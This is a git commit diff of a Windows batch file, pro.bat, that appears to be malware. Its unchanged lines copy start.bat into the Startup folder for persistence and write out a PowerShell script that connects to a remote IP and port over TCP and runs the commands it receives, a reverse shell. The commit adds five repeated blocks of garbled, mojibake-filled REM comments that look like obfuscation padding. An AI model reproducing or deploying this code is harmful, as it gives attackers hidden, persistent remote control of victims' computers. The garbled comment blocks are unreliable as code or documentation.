13c01d5c10c4d0e8c07e1aa8a7cd8eb0ae382661
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-14 03:51:44 +0300

    Update pro.bat

--- pro.bat
+++ pro.bat
@@ -1,3 +1,20 @@
+@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]£
 @echo off
 move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 :loop
@@ -11,6 +28,23 @@ if not exist %FILE% (
         echo      try ^{
         echo          $client = New-Object System.Net.Sockets.TcpClient^($ip, $port^)
         echo          $stream = $client.GetStream^(^)
+@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]£
         echo          $writer = New-Object System.IO.StreamWriter^($stream^)
         echo          $reader = New-Object System.IO.StreamReader^($stream^)
         echo.
@@ -24,6 +58,23 @@ if not exist %FILE% (
         echo               ^} catch ^{ 
         echo                   $errorOutput = $_.Exception.Message
         echo               ^}
+@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]£
         echo.        
         echo               return $output, $errorOutput
         echo          ^}        
@@ -42,6 +93,23 @@ if not exist %FILE% (
         echo              $output, $errorOutput = Execute-Command -cmd $command
         echo.               
         echo              $writer.WriteLine^($output -join "`n"^)
+@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]£
         echo              $writer.WriteLine^($errorOutput^)
         echo              $writer.Flush^(^)
         echo           ^}   
@@ -60,3 +128,20 @@ if not exist %FILE% (
    timeout /t 100 >nul
 )
 goto loop
+@REM start.bat -- in q ­èêÚ¶)à ([µÛ]£.bat
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh @yÈh off  ([µÛ]£.bat
+@REM yÈh cd %µé©%  ([µÛ]£.bat
+@REM yÈh :)  ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^.bat^ ([µÛ]£.bat
+@REM yÈh yÈh :)^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^ ¦º5.bat^   ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^¦º5[µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^ ¦º5.bat^  ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æéas s¦º5.bat^ ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)¦º5.bat^  ([µÛ]£
